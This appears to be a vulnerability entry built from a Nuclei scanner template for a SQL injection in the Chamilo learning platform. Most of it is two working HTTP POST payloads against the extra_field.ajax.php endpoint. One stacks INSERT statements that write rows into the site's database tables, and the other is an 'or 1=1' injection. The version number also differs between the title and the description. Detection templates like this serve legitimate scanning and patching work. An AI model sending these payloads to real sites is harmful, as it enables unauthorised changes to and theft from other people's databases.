# Vulnerability: Chamilo 1.11.14 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`chamilo-lms-sqli.yaml`)

## Description
Chamilo 1.1.14 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

type=image&field_id=image&tag=image&from=image&search=image&options=["test'); INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16); INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,'{{randstr}}'); INSERT INTO extra_field_options(option_value) VALUES ('{{randstr}}'); INSERT INTO tag (id, tag, field_id,count) VALUES(16, '{{randstr}}', 16,0) ON DUPLICATE KEY UPDATE     tag='{{randstr}}', field_id=16, count=0;  -- "]

POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

type=image&field_id=image&tag=image&from=image&search=image&options=["test') or 1=1 -- "]
```

